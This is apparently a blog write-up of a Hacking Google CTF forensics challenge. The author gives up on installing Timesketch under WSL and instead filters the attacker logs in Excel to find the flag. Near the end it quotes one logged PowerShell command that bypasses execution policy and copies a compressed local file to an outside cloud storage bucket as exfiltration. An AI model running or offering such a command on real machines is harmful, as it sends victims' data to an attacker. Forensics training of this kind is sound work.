---
layout: post
title:  "H4CK1NG G00GL3 - EP2C02"
subtitle: "Episode 002 - Challenge 02 - Timesketch Doesn't Like WSL"
date:   2024-09-21 14:05:34 +0300
tags: [CTF, RE, research, hacking-google, forensic-analysis, compromise, timesketch]
readtime: true
cover-img: ["/assets/images/Hacking-Google/Hacking-Google-Cover.png"]
thumbnail-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
share-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
---

Well...That was a weird one - kind of solved it before I even started writing a log. 

Let's go through my steps - downloading the file, I got a compressed file containing a `Readme.md` and a `CTF CSV-EASY-final.csv` files.

The `csv` is not too large but not too small (1.6mb), so I opened the `Readme` first.

It contains a short story about a fictional company detecting a compromised machine and collecting logs from it. My job is to sift through them, follow the malicious actor's footsteps, and discover the flag.

The file also contains a walkthrough on installing [Timesketch](https://github.com/google/timesketch). I'm not familiar with it in particular, but programs that process logs are commonly used in detection & resposne teams for forensic analysis during incidents. Turns out, Timesketch is Google's own (open-source) log analysis tool.

I followed the installation guide, which deploys Timesketch using `docker-compose`, a tool that allows deploying multi-container docker apps.

Downloading the relevant images and running `docker-compose` on the given `.yml` file, looks like Timesketch starts a local nginx server with a redis database, along with opensearch - a tool for searching through large data.

I bumped into an issue with deploying the app - it had issues with binding to port 80, even though it wasn't taken, but then locked it forever until I restarted WSL. 

I tried fixing it for a while to no avail. I seems to be a (sadly common) issue with deploying processes on WSL that bind on common ports.

After failing for a while, I decided to take a peek at the `csv` manually:

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep02-C02-csv.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>First few lines of the collected logs</i></figcaption>
</figure>

The table seems to list actions executed by the malicious actor on a Windows machine. The actions start off with some commands for initial recon in CMD, and then moved to execute powershell commands.

The file contains thousands of actions, and I needed a quick way to sift through them. I created a filter over the entire table and looked for columns which contained small distinct number of options.

Some columns have just one or two distinct values whereas others have thousands. However, I found `target_executed_command` to be especially interesting because, besides having a very attractive name, has just about two dozen distinct values.

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep02-C02-commands.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>Commands executed by the malicious actor</i></figcaption>
</figure>

Scrolling to the right in the little Excel pop-up, and skimming over the commands, something immediately pops up - the URL of a flag! 

`powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName="exfil-xbhqwf-$($SourceFile.name)";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/...
}/$RemoteName;`

The domain is jumbled, probably meant to stop hunters from searching the domain in the entire `csv`. 

This command and others in a short timeframe around it point to the malicious actor trying to exfiltrate data from the machine to a Google storage bucket. The binary values before the flag URL simply spell out `FLAG:`.

Anyway, it's unfortunate I wasn't able to see how Timesketch works and solve this using it. But in any case - I have my flag.